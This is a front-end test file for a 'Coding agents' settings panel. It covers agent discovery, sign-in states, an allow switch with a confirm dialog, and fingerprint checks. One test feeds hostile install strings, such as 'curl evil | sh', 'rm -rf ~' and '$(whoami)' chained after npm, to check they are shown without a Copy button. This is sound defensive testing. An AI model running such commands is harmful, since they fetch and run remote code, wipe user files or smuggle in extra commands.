import { act, cleanup, fireEvent, render, screen, waitFor, within } from '@testing-library/react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { readAgentRow, readAgentTest, readSignInMethods } from '../../assistant/api';
import { agentCapsOf, agentChoices, isAgentProvider, resetStatusStore } from '../../assistant/status';
import type { AgentRow, AssistantStatus } from '../../assistant/wire';
import { AGENT_LIMITS_TEXT, AssistantStep, PRIVACY_COPY } from './AssistantStep';
import {
  AGENTS_CHECKING_TEXT,
  AGENTS_INTRO,
  agentRowState,
  agentSaidSignedOut,
  agentTestLine,
  allowChangedText,
  allowCopy,
  allowTitle,
  allowWarning,
  billingText,
  CONNECT_AGAIN,
  connectedSignedOutText,
  connectedUnsureText,
  connectNote,
  MCP_UNAVAILABLE_TEXT,
  privacyDeniedText,
  CUSTOM_HELP,
  defaultBillingText,
  holdsOldAllow,
  KEEP_ENV_MAX,
  mayShowSignInCommand,
  LOGIN_NO,
  LOGIN_UNKNOWN,
  LOGIN_YES,
  NO_AGENT_TEST_TEXT,
  NO_SIGN_IN_TEXT,
  offeredModes,
  modeChoice,
  OWN_TOOLS_OFF,
  OWN_TOOLS_ON,
  SIGNIN_AGENT_NOTE,
  SIGNIN_TERMINAL_TEXT,
  signInDocsText,
  signInFooter,
  signInHeading,
  signInVarText,
  testingText,
  testNote,
  TREE_KILL_TEXT,
  TURN_OFF_LABEL,
  turnOffNote,
  VARS_HELP,
} from './AssistantStepAgents';
import { MCP_DEPS_TEXT } from './AssistantStepMcp';

// The real dialog for the tests that press its keys; a scripted answer for the others.
const confirmAction = vi.fn(async (_opts?: Record<string, unknown>) => false);
let realDialog = false;
vi.mock('../../workbench/dialogs', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../../workbench/dialogs')>();
  return {
    ...actual,
    confirmAction: (opts?: Record<string, unknown>) => (realDialog ? actual.confirmAction(opts) : confirmAction(opts)),
  };
});

const NO_KEY = { set: false, last4: null, set_at: null, state: 'none' };
const FP = 'a'.repeat(64);
const FP2 = 'b'.repeat(64);

type Answer = { status: number; body: unknown };
type Request = { method: string; path: string; query: string; body: Record<string, unknown> };
type Deferred = { promise: Promise<void>; release: () => void };

function deferred(): Deferred {
  let release = () => {};
  const promise = new Promise<void>((r) => (release = r));
  return { promise, release };
}

/** The Assistant's routes as a test server. */
let status: Record<string, unknown>;
let rows: Array<Record<string, unknown>>;
let requests: Request[];
let agentsAnswer: Answer | null;
let holdAgents: Deferred | null;
let allowAnswer: Answer | null;
/** Holds the next allow POST's answer (once). */
let holdAllow: Deferred | null;
let customAnswer: Answer | null;
let removeAnswer: Answer | null;
let settingsAnswer: Answer | null;
let testAnswer: Answer;
let holdTest: Deferred | null;
let signInAnswer: Answer;
let writeText: ReturnType<typeof vi.fn>;

function baseStatus(extra: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    ok: true,
    available: true,
    provider: 'off',
    models: { anthropic: 'm-1', openai: 'm-2', openai_compatible: '' },
    base_url: 'http://127.0.0.1:1234/v1',
    base_url_is_local: true,
    effort: 'default',
    privacy: 'ask',
    consents: 0,
    caps: { turn_usd: 3, day_usd: 15, steps: 50, turn_minutes: 30, turn_tokens: 3_000_000 },
    keys: { anthropic: NO_KEY, openai: NO_KEY, openai_compatible: NO_KEY },
    storage: { kind: 'file', reason: null, note: '' },
    keys_notice: null,
    spent_today_usd: 0,
    test_protector: null,
    agent_caps: { changes: 24, calls: 400, turn_minutes: 60 },
    agents_checked_at: null,
    agents_tree_kill: 'job',
    ...extra,
  };
}

/** A row as GET /api/assistant/agents answers it (spec 5.4): a known agent, found, signed in, its own tools off. */
function row(over: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    id: 'claude',
    name: 'Claude Code',
    kind: 'known',
    found: true,
    install: null,
    program: 'C:\\npm\\claude-agent-acp.cmd',
    script: 'C:\\npm\\node_modules\\@agentclientprotocol\\claude-agent-acp\\dist\\index.js',
    version: '0.85.1',
    verified_package: true,
    signed_in: 'yes',
    key_var: null,
    lockdown: 'tools_off',
    own_tools: 'off',
    needs_allow: false,
    allowed: false,
    allow_changed: false,
    fingerprint: FP,
    model: null,
    mode: null,
    last: null,
    sign_in: null,
    ready: true,
    reason: null,
    error: null,
    ...over,
  };
}

/** A known agent whose own tools stay on: it needs its switch. */
const codex = (over: Record<string, unknown> = {}) =>
  row({ id: 'codex', name: 'Codex', program: 'C:\\npm\\codex-acp.cmd', script: 'C:\\npm\\x.js', version: '2.1.1', lockdown: 'none', own_tools: 'on', needs_allow: true, ready: false, reason: 'agent_not_allowed', fingerprint: FP2, ...over });
const missing = (id: string, name: string, install: string) =>
  row({ id, name, found: false, install, program: null, script: null, version: null, verified_package: false, signed_in: 'unknown', lockdown: 'none', own_tools: 'on', needs_allow: true, fingerprint: null, ready: false, reason: 'agent_missing' });

const json = (s: number, body: unknown) => new Response(JSON.stringify(body), { status: s, headers: { 'Content-Type': 'application/json' } });
const NOT_FOUND: Answer = { status: 404, body: { error: 'route not found' } };

function applySettings(patch: Record<string, unknown>): Answer {
  if (settingsAnswer) return settingsAnswer;
  const next = { ...status };
  if ('provider' in patch) next.provider = patch.provider;
  if ('agent_caps' in patch) next.agent_caps = { ...(next.agent_caps as object), ...(patch.agent_caps as object) };
  if ('agents' in patch) {
    for (const [id, p] of Object.entries(patch.agents as Record<string, Record<string, unknown>>)) {
      rows = rows.map((r) => (r.id === id ? { ...r, ...p } : r));
    }
  }
  status = next;
  return { status: 200, body: status };
}

async function route(method: string, path: string, body: Record<string, unknown>): Promise<Answer> {
  if (path === '/api/assistant/status') return { status: 200, body: status };
  if (path === '/api/assistant/settings') return applySettings(body);
  if (path === '/api/assistant/agents' && method === 'GET') {
    if (holdAgents) await holdAgents.promise;
    return agentsAnswer ?? { status: 200, body: { ok: true, checked_at: '2026-10-17T12:00:00.000Z', took_ms: 12, agents: rows } };
  }
  if (path === '/api/assistant/agents/allow') {
    const hold = holdAllow;
    holdAllow = null;
    if (hold) await hold.promise;
    if (allowAnswer) return allowAnswer;
    const i = rows.findIndex((r) => r.id === body.id);
    const allowed = body.allow === true;
    rows[i] = { ...rows[i], allowed, allow_changed: false, ready: allowed, reason: allowed ? null : 'agent_not_allowed' };
    return { status: 200, body: { ok: true, agent: rows[i] } };
  }
  if (path === '/api/assistant/agents/custom') {
    if (customAnswer) return customAnswer;
    const r = row({
      id: 'custom-a1b2c3',
      name: body.name,
      kind: 'custom',
      program: 'C:\\agents\\my-agent.exe',
      script: null,
      version: null,
      verified_package: false,
      signed_in: 'unknown',
      lockdown: 'none',
      own_tools: 'on',
      needs_allow: true,
      ready: false,
      reason: 'agent_not_allowed',
      fingerprint: FP2,
    });
    rows = [...rows, r];
    return { status: 200, body: { ok: true, agent: r } };
  }
  if (path === '/api/assistant/agents/custom/remove') {
    if (removeAnswer) return removeAnswer;
    rows = rows.filter((r) => r.id !== body.id);
    return { status: 200, body: { ok: true } };
  }
  if (path === '/api/assistant/agents/test') {
    if (holdTest) await holdTest.promise;
    return testAnswer;
  }
  if (path === '/api/assistant/agents/sign-in') return signInAnswer;
  return NOT_FOUND;
}

beforeEach(() => {
  resetStatusStore();
  confirmAction.mockReset();
  confirmAction.mockResolvedValue(false);
  realDialog = false;
  status = baseStatus();
  rows = [row()];
  requests = [];
  agentsAnswer = null;
  holdAgents = null;
  allowAnswer = null;
  holdAllow = null;
  customAnswer = null;
  removeAnswer = null;
  settingsAnswer = null;
  testAnswer = NOT_FOUND;
  holdTest = null;
  signInAnswer = NOT_FOUND;
  writeText = vi.fn(async () => {});
  Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
  vi.stubGlobal(
    'fetch',
    vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
      const url = String(input);
      const method = init?.method || 'GET';
      const body = typeof init?.body === 'string' ? (JSON.parse(init.body) as Record<string, unknown>) : {};
      const [path, query = ''] = url.split('?');
      requests.push({ method, path, query, body });
      const a = await route(method, path, body);
      return json(a.status, a.body);
    }),
  );
});

afterEach(() => {
  cleanup();
  document.getElementById('modal-confirm')?.remove();
  vi.unstubAllGlobals();
});

const q = <T extends Element = HTMLElement>(sel: string) => document.querySelector<T>(sel);
const agent = (id: string) => q(`[data-assistant-agent="${id}"]`)!;
const stateOf = (id: string) => agent(id)?.getAttribute('data-assistant-agent-state');
const posts = (path: string) => requests.filter((r) => r.method === 'POST' && r.path === path).map((r) => r.body);
const listReads = () => requests.filter((r) => r.method === 'GET' && r.path === '/api/assistant/agents');

async function renderStep(extra: Record<string, unknown> = {}) {
  status = baseStatus(extra);
  const view = render(<AssistantStep panelId="wiz-assistant" />);
  await waitFor(() => expect(q('[data-assistant-step]')).toBeTruthy());
  return view;
}

/** The step with the agents listed. */
async function renderAgents(extra: Record<string, unknown> = {}) {
  const view = await renderStep(extra);
  await waitFor(() => expect(q('[data-assistant-agent]')).toBeTruthy());
  return view;
}

/** The app's confirm dialog as shell.html has it (for the tests that press its keys). */
function mountDialog() {
  realDialog = true;
  const modal = document.createElement('div');
  modal.id = 'modal-confirm';
  modal.hidden = true;
  modal.innerHTML =
    '<div id="cf-backdrop"></div><h2 id="cf-heading"></h2><p id="cf-copy"></p><button id="cf-cancel" type="button">Cancel</button><button id="cf-confirm" type="button">Delete</button>';
  document.body.append(modal);
  return modal;
}

describe('Settings → Assistant → Coding agents', () => {
  it('is mounted in the step after the provider cards and above Other apps (MCP), with its intro', async () => {
    await renderAgents({ mcp: { clients: false, running: false, reason: null, port: null, connected: 0 } });
    const order = [...document.querySelectorAll('[data-assistant-cards], [data-assistant-agents], [data-assistant-mcp], [data-assistant-privacy]')].map((el) =>
      el.hasAttribute('data-assistant-cards') ? 'cards' : el.hasAttribute('data-assistant-agents') ? 'agents' : el.hasAttribute('data-assistant-mcp') ? 'mcp' : 'privacy',
    );
    expect(order).toEqual(['cards', 'agents', 'mcp', 'privacy']);
    expect(within(q('[data-assistant-agents]')!).getByRole('heading', { name: 'Coding agents' })).toBeInTheDocument();
    expect(q('[data-assistant-agents-intro]')!.textContent).toBe(AGENTS_INTRO);
    expect(AGENTS_INTRO).toBe(
      "Use a coding agent you already have, signed in with your own account. Magnusim starts it on this PC and gives it Magnusim's tools; you need no API key here. What it does is billed to your account with that agent.",
    );
  });

  it('a server without the agents route shows no block; one that fails says why, and Retry reads again', async () => {
    agentsAnswer = NOT_FOUND;
    await renderStep();
    await waitFor(() => expect(listReads()).toHaveLength(1));
    await waitFor(() => expect(q('[data-assistant-agents]')).toBeNull());
    cleanup();
    resetStatusStore();
    agentsAnswer = { status: 500, body: { ok: false, error: 'Discovery broke.' } };
    await renderStep();
    await waitFor(() => expect(q('[data-assistant-agents-error]')).toHaveTextContent("Couldn't look for coding agents: Discovery broke."));
    agentsAnswer = null;
    fireEvent.click(within(q('[data-assistant-agents-error]')!).getByRole('button', { name: 'Retry' }));
    await waitFor(() => expect(q('[data-assistant-agent="claude"]')).toBeTruthy());
    expect(q('[data-assistant-agents-error]')).toBeNull();
  });

  it('says it is looking while the first list is read, then lists each agent; the status is read again so the Default choice offers them', async () => {
    holdAgents = deferred();
    await renderStep();
    await waitFor(() => expect(q('[data-assistant-agents-checking]')).toHaveTextContent(AGENTS_CHECKING_TEXT));
    expect(q('[data-assistant-agents]')).toHaveAttribute('aria-busy', 'true');
    const statusReads = () => requests.filter((r) => r.path === '/api/assistant/status').length;
    const before = statusReads();
    // The server's status lists the agent once the list was read (its cache).
    status = { ...status, providers_ready: { 'agent:claude': { label: 'Claude Code', kind: 'agent', ready: true, reason: null, billing: 'agent_account', detail: 'Signed in · 0.85.1' } } };
    await act(async () => holdAgents!.release());
    await waitFor(() => expect(stateOf('claude')).toBe('ready'));
    expect(q('[data-assistant-agents-checking]')).toBeNull();
    await waitFor(() => expect(statusReads()).toBeGreaterThan(before));
    await waitFor(() => expect(q('[data-assistant-default-option="agent:claude"]')).toBeTruthy());
  });

  it('Refresh asks every version again; one that fails says why and keeps the rows', async () => {
    await renderAgents();
    expect(listReads().map((r) => r.query)).toEqual(['']);
    fireEvent.click(q('[data-assistant-agents-refresh]')!);
    await waitFor(() => expect(listReads().map((r) => r.query)).toEqual(['', 'refresh=1']));
    await waitFor(() => expect(q('[data-assistant-agents-refresh]')).toHaveTextContent('Refresh'));
    agentsAnswer = { status: 500, body: { ok: false, error: 'Discovery broke.' } };
    fireEvent.click(q('[data-assistant-agents-refresh]')!);
    await waitFor(() => expect(q('[data-assistant-agents-read-error]')).toHaveTextContent("Couldn't look for coding agents again: Discovery broke."));
    expect(q('[data-assistant-agents-read-error]')).toHaveAttribute('role', 'alert');
    expect(stateOf('claude')).toBe('ready');
    agentsAnswer = null;
    fireEvent.click(q('[data-assistant-agents-refresh]')!);
    await waitFor(() => expect(q('[data-assistant-agents-read-error]')).toBeNull());
  });

  it('shows the Windows PowerShell note when stopping an agent can only be best effort', async () => {
    await renderAgents({ agents_tree_kill: 'best_effort' });
    expect(q('[data-assistant-agents-tree-kill]')!.textContent).toBe(TREE_KILL_TEXT);
    cleanup();
    resetStatusStore();
    await renderAgents();
    expect(q('[data-assistant-agents-tree-kill]')).toBeNull();
  });
});

describe('Coding agents: each row state', () => {
  it('ready: "<Name> <version> · <login line> · <own-tools line>", the program, Test (it says it sends one short message) and the billing line', async () => {
    await renderAgents();
    const r = agent('claude');
    expect(stateOf('claude')).toBe('ready');
    expect(r.querySelector('[data-assistant-agent-line]')!.textContent).toBe(`Claude Code 0.85.1 · ${LOGIN_YES} · ${OWN_TOOLS_OFF}`);
    expect(r.querySelector('[data-assistant-agent-program]')!.textContent).toContain('claude-agent-acp.cmd');
    expect(r.querySelector('[data-assistant-agent-program]')!.textContent).toContain('dist\\index.js');
    const test = within(r).getByRole('button', { name: 'Test' });
    expect(test).toHaveAccessibleDescription(testNote('Claude Code'));
    expect(testNote('Claude Code')).toBe('Test starts Claude Code and sends it one short message.');
    expect(r.querySelector('[data-assistant-agent-billing]')!.textContent).toBe(billingText('Claude Code'));
    expect(billingText('Claude Code')).toBe("Billed to your Claude Code account; Magnusim's $ limits don't apply to it. The limits under Coding agents do.");
    // Its own tools are off: no switch.
    expect(r.querySelector('[data-assistant-agent-allow]')).toBeNull();
    expect(r.querySelector('[data-assistant-agent-signin]')).toBeNull();
  });

  it('the login lines: signed in, a key variable, unknown, not signed in', async () => {
    rows = [
      row({ id: 'a', name: 'A', signed_in: 'yes' }),
      row({ id: 'b', name: 'B', signed_in: 'key', key_var: 'B_API_KEY' }),
      row({ id: 'c', name: 'C', signed_in: 'unknown' }),
      row({ id: 'd', name: 'D', signed_in: 'no', ready: false, reason: 'agent_signed_out' }),
    ];
    await renderAgents();
    const line = (id: string) => agent(id).querySelector('[data-assistant-agent-line]')!.textContent;
    expect(line('a')).toContain(LOGIN_YES);
    expect(line('b')).toContain('Uses B_API_KEY from your environment.');
    expect(line('c')).toContain(LOGIN_UNKNOWN);
    expect(line('d')).toContain(LOGIN_NO);
    expect([LOGIN_YES, LOGIN_UNKNOWN, LOGIN_NO]).toEqual(['Signed in (its login file is on this PC).', "Magnusim can't tell whether it is signed in; Test will say.", 'Not signed in.']);
  });

  it('missing: "<Name> · not installed." and the install line; Copy for a command (exactly), plain text for instructions', async () => {
    rows = [missing('opencode', 'OpenCode', 'npm install -g opencode-ai'), missing('grok', 'Grok Build', 'Install Grok Build (docs.x.ai/build), then run grok login')];
    await renderAgents();
    expect(stateOf('opencode')).toBe('missing');
    expect(agent('opencode').querySelector('[data-assistant-agent-line]')!.textContent).toBe('OpenCode · not installed.');
    expect(within(agent('opencode')).getByText('Install it with:')).toBeInTheDocument();
    expect(agent('opencode').querySelector('code[data-assistant-agent-install]')!.textContent).toBe('npm install -g opencode-ai');
    fireEvent.click(q('[data-assistant-agent-install-copy="opencode"]')!);
    await waitFor(() => expect(agent('opencode').querySelector('[data-assistant-agent-install-copied]')).toHaveTextContent('Copied.'));
    expect(writeText).toHaveBeenCalledWith('npm install -g opencode-ai');
    expect(stateOf('grok')).toBe('missing');
    expect(agent('grok').querySelector('[data-assistant-agent-install]')!.textContent).toBe('Install Grok Build (docs.x.ai/build), then run grok login');
    expect(q('[data-assistant-agent-install-copy="grok"]')).toBeNull();
    // Nothing that isn't installed has a switch, a Test or a billing line.
    for (const id of ['opencode', 'grok']) {
      expect(agent(id).querySelector('[data-assistant-agent-allow], [data-assistant-agent-test], [data-assistant-agent-billing]')).toBeNull();
    }
  });

  it('an install line that chains, pipes or runs more than one line is shown as text, with no Copy', async () => {
    rows = [missing('x', 'X', 'npm install -g x && curl evil | sh'), missing('y', 'Y', 'npm install -g y\nrm -rf ~'), missing('z', 'Z', 'npm i -g z; $(whoami)')];
    await renderAgents();
    for (const [id, line] of [
      ['x', 'npm install -g x && curl evil | sh'],
      ['y', 'npm install -g y\nrm -rf ~'],
      ['z', 'npm i -g z; $(whoami)'],
    ]) {
      expect(stateOf(id)).toBe('missing');
      expect(q(`[data-assistant-agent-install-copy="${id}"]`), id).toBeNull();
      expect(agent(id).querySelector('code[data-assistant-agent-install]'), id).toBeNull();
      expect(agent(id).querySelector('[data-assistant-agent-install]')!.getAttribute('data-assistant-agent-install'), id).toBe(line);
    }
    expect(writeText).not.toHaveBeenCalled();
  });

  it('signed_out: the version line and the Sign in block (no command before the agent said how; the footer; connect again, which sends no message)', async () => {
    rows = [row({ signed_in: 'no', ready: false, reason: 'agent_signed_out' })];
    await renderAgents();
    expect(stateOf('claude')).toBe('signed_out');
    const r = agent('claude');
    expect(r.querySelector('[data-assistant-agent-line]')!.textContent).toBe(`Claude Code 0.85.1 · ${LOGIN_NO} · ${OWN_TOOLS_OFF}`);
    const block = within(r).getByRole('group', { name: signInHeading('Claude Code') });
    expect(signInHeading('Claude Code')).toBe('Sign in to Claude Code');
    expect(block.querySelector('[data-assistant-agent-signin-docs]')!.textContent).toBe(signInDocsText('Claude Code'));
    expect(signInDocsText('Claude Code')).toBe('Sign in to Claude Code the way its own documentation says.');
    expect(block.querySelector('[data-assistant-agent-signin-footer]')!.textContent).toBe(signInFooter('Claude Code'));
    expect(signInFooter('Claude Code')).toBe("Magnusim has no field for Claude Code's key on purpose: the agent keeps its own login.");
    const again = within(block).getByRole('button', { name: CONNECT_AGAIN });
    expect(CONNECT_AGAIN).toBe("I've signed in: connect again");
    expect(again).toHaveAccessibleDescription(connectNote('Claude Code'));
    expect(within(r).queryByRole('button', { name: 'Test' })).toBeNull();
  });

  it('needs_allow: the version and login line, the warning beside the switch (off); allow_changed: the changed text and the switch off', async () => {
    rows = [codex(), codex({ id: 'codex2', name: 'Codex Two', allow_changed: true, reason: 'agent_allow_changed' })];
    await renderAgents();
    expect(stateOf('codex')).toBe('needs_allow');
    const r = agent('codex');
    expect(r.querySelector('[data-assistant-agent-line]')!.textContent).toBe(`Codex 2.1.1 · ${LOGIN_YES}`);
    const sw = within(r).getByRole('switch', { name: 'Allow this agent' });
    expect(sw).not.toBeChecked();
    const warning = r.querySelector('[data-assistant-agent-allow-warning]')!;
    expect(warning).toHaveAttribute('role', 'note');
    expect(warning.textContent).toBe(allowWarning('Codex'));
    expect(sw).toHaveAccessibleDescription(allowWarning('Codex'));
    expect(within(r).queryByRole('button', { name: 'Test' })).toBeNull();
    expect(stateOf('codex2')).toBe('allow_changed');
    expect(agent('codex2').querySelector('[data-assistant-agent-allow-changed]')!.textContent).toBe(allowChangedText('Codex Two'));
    expect(allowChangedText('Codex Two')).toBe("Codex Two's command or program changed since you allowed it. Allow it again to use it.");
    expect(within(agent('codex2')).getByRole('switch', { name: 'Allow this agent' })).not.toBeChecked();
    expect(agent('codex2').querySelector('[data-assistant-agent-allow-warning]')).toBeTruthy();
  });

  it('the allow warning names the agent running commands, reading projects whatever privacy says, and other accounts on this PC', () => {
    const w = allowWarning('Codex');
    expect(w).toBe(
      "Codex's own tools can't be switched off from Magnusim. Once allowed, it can run commands and change files on this PC by its own rules, as it does in a terminal. It can also read your Magnusim projects, whatever the privacy setting says. Magnusim's questions cover only Magnusim's tools. Anyone else signed in to this PC can reach Magnusim's settings too; allow agents only on a PC whose other accounts you trust.",
    );
    expect(w).toContain('read your Magnusim projects');
    expect(w).toContain('Anyone else signed in to this PC');
  });

  it('an allowed agent whose own tools stay on is ready with the switch on and its warning, and says its own tools stay on', async () => {
    rows = [codex({ allowed: true, ready: true, reason: null })];
    await renderAgents();
    expect(stateOf('codex')).toBe('ready');
    expect(agent('codex').querySelector('[data-assistant-agent-line]')!.textContent).toBe(`Codex 2.1.1 · ${LOGIN_YES} · ${OWN_TOOLS_ON}`);
    expect(within(agent('codex')).getByRole('switch', { name: 'Allow this agent' })).toBeChecked();
    expect(agent('codex').querySelector('[data-assistant-agent-allow-warning]')!.textContent).toBe(allowWarning('Codex'));
    expect([OWN_TOOLS_OFF, OWN_TOOLS_ON]).toEqual([
      'Its own shell, file and web tools are off while it works for Magnusim.',
      'Its own tools stay on: it can run commands and change files on this PC by its own rules.',
    ]);
  });

  it("error: a command that can't be started says why (an alert), with no Test", async () => {
    rows = [row({ id: 'custom-000001', name: 'Shell thing', kind: 'custom', lockdown: 'none', own_tools: 'on', needs_allow: true, ready: false, reason: 'cant_start_script', error: "Magnusim starts agents without a command shell, so it can't start x.bat." })];
    await renderAgents();
    expect(stateOf('custom-000001')).toBe('error');
    expect(agent('custom-000001').querySelector('[data-assistant-agent-error]')).toHaveAttribute('role', 'alert');
    expect(agent('custom-000001').querySelector('[data-assistant-agent-error]')!.textContent).toContain("can't start x.bat");
    expect(agent('custom-000001').querySelector('[data-assistant-agent-test], [data-assistant-agent-allow]')).toBeNull();
  });

  it("a row whose tool connection can't run says why, from the status' reason: its package missing (run Setup again, never restart) or anything else (restart)", async () => {
    rows = [row({ ready: false, reason: 'mcp_unavailable' })];
    await renderAgents({ mcp: { clients: false, running: false, reason: 'deps_missing', port: null, connected: 0 } });
    expect(agent('claude').querySelector('[data-assistant-agent-mcp]')!.textContent).toBe(MCP_DEPS_TEXT);
    expect(MCP_DEPS_TEXT).toBe("Magnusim's tool-connection package isn't installed. Run Setup.bat again.");
    expect(agent('claude').textContent).not.toContain('Restart Magnusim');
    cleanup();
    resetStatusStore();
    await renderAgents({ mcp: { clients: false, running: false, reason: 'bind_failed', port: 51234, connected: 0 } });
    expect(agent('claude').querySelector('[data-assistant-agent-mcp]')!.textContent).toBe(MCP_UNAVAILABLE_TEXT);
    expect(MCP_UNAVAILABLE_TEXT).toBe("Magnusim couldn't open the connection its tools use. Restart Magnusim; if it keeps happening, see Other apps (MCP) below.");
  });

  it('under Never send project data an agent whose own tools stay on says it is off and why (every turn on it is refused), its dot grey; one whose tools are off says nothing of it', async () => {
    rows = [codex({ allowed: true, ready: false, reason: 'privacy_denied' }), row()];
    await renderAgents({ privacy: 'deny' });
    const r = agent('codex');
    expect(r.querySelector('[data-assistant-agent-privacy]')!.textContent).toBe(privacyDeniedText('Codex'));
    expect(privacyDeniedText('Codex')).toBe('Codex can read your project files with its own tools, so it stays off while Project data (below) is set to Never send project data.');
    expect(r.querySelector('[data-assistant-dot]')).toHaveAttribute('data-assistant-dot', 'not-ready');
    expect(agent('claude').querySelector('[data-assistant-agent-privacy]')).toBeNull();
  });

  it('agentRowState: every state from a row and the checks run here', () => {
    const r = readAgentRow(row())!;
    expect(agentRowState(r)).toBe('ready');
    expect(agentRowState(r, 'testing')).toBe('testing');
    expect(agentRowState(readAgentRow(missing('x', 'X', 'npm install -g x'))!)).toBe('missing');
    expect(agentRowState(readAgentRow(row({ signed_in: 'no' }))!)).toBe('signed_out');
    // A check that got through to an agent signed in (its answer to the Test, or its own word): ready, whatever the login file says.
    expect(agentRowState(readAgentRow(row({ signed_in: 'no' }))!, null, { kind: 'check', answered: true, good: true, text: '', code: null, auth: null, login: 'connected' })).toBe('ready');
    // A connect it said nothing on, with no login file: Test is offered (it will say).
    expect(agentRowState(readAgentRow(row({ signed_in: 'no' }))!, null, { kind: 'check', answered: true, good: true, text: '', code: null, auth: null, login: 'unsure' })).toBe('ready');
    expect(agentRowState(readAgentRow(codex())!)).toBe('needs_allow');
    expect(agentRowState(readAgentRow(codex({ allow_changed: true }))!)).toBe('allow_changed');
    expect(agentRowState(r, null, { kind: 'check', answered: false, good: false, text: 'x', code: 'agent_exited', auth: null, login: null })).toBe('error');
    // The agent's own word over its login file: its last auth_required (the server's sign_in), or a connect that got through saying it isn't signed in.
    expect(agentRowState(readAgentRow(row({ signed_in: 'yes', sign_in: { methods: [] } }))!)).toBe('signed_out');
    expect(agentRowState(r, null, { kind: 'check', answered: true, good: false, text: 'x', code: null, auth: null, login: 'signed_out' })).toBe('signed_out');
    expect(agentRowState(readAgentRow(row({ signed_in: 'no' }))!, null, { kind: 'check', answered: true, good: false, text: 'x', code: null, auth: null, login: 'signed_out' })).toBe('signed_out');
    // A check listed its choices once (the server's `last`): the login file still says, as the server's readiness does.
    expect(agentRowState(readAgentRow(row({ signed_in: 'no', last: { modes: [], models: [], at: 'now' } }))!)).toBe('signed_out');
  });
});

describe('Coding agents: the allow switch (D-B)', () => {
  it('turning it on asks first (safe: No focused), and Don\u2019t sends nothing; focus is back on the switch', async () => {
    rows = [codex()];
    await renderAgents();
    const sw = within(agent('codex')).getByRole('switch', { name: 'Allow this agent' });
    sw.focus();
    fireEvent.click(sw);
    await waitFor(() => expect(confirmAction).toHaveBeenCalledTimes(1));
    expect(confirmAction.mock.calls[0][0]).toEqual({ title: allowTitle('Codex'), copy: allowCopy('Codex'), yes: 'Allow', no: "Don't", safe: true });
    expect(allowTitle('Codex')).toBe('Allow Codex to work for the Assistant?');
    expect(allowCopy('Codex')).toBe(
      "Codex can run commands, read your projects and change files on this PC by its own rules, and Magnusim can't stop that. Allow it only if you trust it as you do in a terminal.",
    );
    await waitFor(() => expect(document.activeElement).toBe(sw));
    expect(sw).not.toBeChecked();
    expect(posts('/api/assistant/agents/allow')).toEqual([]);
  });

  it('with the real dialog: Don\u2019t has the focus, and Enter answers Don\u2019t (no POST, the switch stays off)', async () => {
    const modal = mountDialog();
    rows = [codex()];
    await renderAgents();
    const sw = within(agent('codex')).getByRole('switch', { name: 'Allow this agent' });
    fireEvent.click(sw);
    await waitFor(() => expect(modal.hidden).toBe(false));
    expect(q('#cf-heading')!.textContent).toBe(allowTitle('Codex'));
    expect(document.activeElement).toBe(q('#cf-cancel'));
    expect(q('#cf-cancel')!.textContent).toBe("Don't");
    expect(q('#cf-confirm')!.textContent).toBe('Allow');
    fireEvent.keyDown(document, { key: 'Enter' });
    await waitFor(() => expect(modal.hidden).toBe(true));
    await waitFor(() => expect(document.activeElement).toBe(sw));
    expect(sw).not.toBeChecked();
    expect(posts('/api/assistant/agents/allow')).toEqual([]);
    // A click on Allow allows it.
    fireEvent.click(sw);
    await waitFor(() => expect(modal.hidden).toBe(false));
    fireEvent.click(q('#cf-confirm')!);
    await waitFor(() => expect(sw).toBeChecked());
    expect(posts('/api/assistant/agents/allow')).toEqual([{ id: 'codex', allow: true, fingerprint: FP2 }]);
  });

  it('Allow POSTs the fingerprint of the command the row shows; the row turns ready, the status is read again; off needs no question', async () => {
    rows = [codex()];
    confirmAction.mockResolvedValue(true);
    await renderAgents();
    const sw = () => within(agent('codex')).getByRole('switch', { name: 'Allow this agent' });
    sw().focus();
    const statusReads = () => requests.filter((r) => r.path === '/api/assistant/status').length;
    const before = statusReads();
    fireEvent.click(sw());
    await waitFor(() => expect(stateOf('codex')).toBe('ready'));
    expect(posts('/api/assistant/agents/allow')).toEqual([{ id: 'codex', allow: true, fingerprint: FP2 }]);
    expect(sw()).toBeChecked();
    expect(document.activeElement).toBe(sw());
    await waitFor(() => expect(statusReads()).toBeGreaterThan(before));
    // Off: at once, no question, no fingerprint.
    confirmAction.mockClear();
    fireEvent.click(sw());
    await waitFor(() => expect(stateOf('codex')).toBe('needs_allow'));
    expect(confirmAction).not.toHaveBeenCalled();
    expect(posts('/api/assistant/agents/allow')).toEqual([
      { id: 'codex', allow: true, fingerprint: FP2 },
      { id: 'codex', allow: false },
    ]);
    expect(sw()).not.toBeChecked();
  });

  it("a command that changed meanwhile is refused with the new row: its text shows, and the switch stays off", async () => {
    rows = [codex()];
    confirmAction.mockResolvedValue(true);
    allowAnswer = {
      status: 409,
      body: { ok: false, code: 'fingerprint_changed', error: "Codex's command or program changed. Look at it again before you allow it.", agent: codex({ program: 'D:\\other\\codex-acp.exe', fingerprint: 'c'.repeat(64) }) },
    };
    await renderAgents();
    fireEvent.click(within(agent('codex')).getByRole('switch', { name: 'Allow this agent' }));
    await waitFor(() => expect(agent('codex').querySelector('[data-assistant-agent-allow-error]')).toHaveTextContent("Codex's command or program changed."));
    expect(agent('codex').querySelector('[data-assistant-agent-allow-error]')).toHaveAttribute('role', 'alert');
    expect(agent('codex').querySelector('[data-assistant-agent-program]')!.textContent).toContain('D:\\other\\codex-acp.exe');
    expect(within(agent('codex')).getByRole('switch', { name: 'Allow this agent' })).not.toBeChecked();
  });

  it('one save at a time: off asked while Allow is saving is sent once Allow has answered, and the switch ends off; on asked meanwhile is dropped', async () => {
    rows = [codex()];
    confirmAction.mockResolvedValue(true);
    const hold = deferred();
    holdAllow = hold;
    await renderAgents();
    const sw = () => within(agent('codex')).getByRole('switch', { name: 'Allow this agent' });
    fireEvent.click(sw());
    await waitFor(() => expect(posts('/api/assistant/agents/allow')).toHaveLength(1));
    expect(sw()).toBeChecked();
    // Off while Allow's POST is out: shown off at once, sent only once Allow has answered.
    fireEvent.click(sw());
    expect(sw()).not.toBeChecked();
    // On again meanwhile: no question, nothing sent, still off.
    fireEvent.click(sw());
    expect(sw()).not.toBeChecked();
    await act(async () => {
      await new Promise((r) => setTimeout(r, 0));
    });
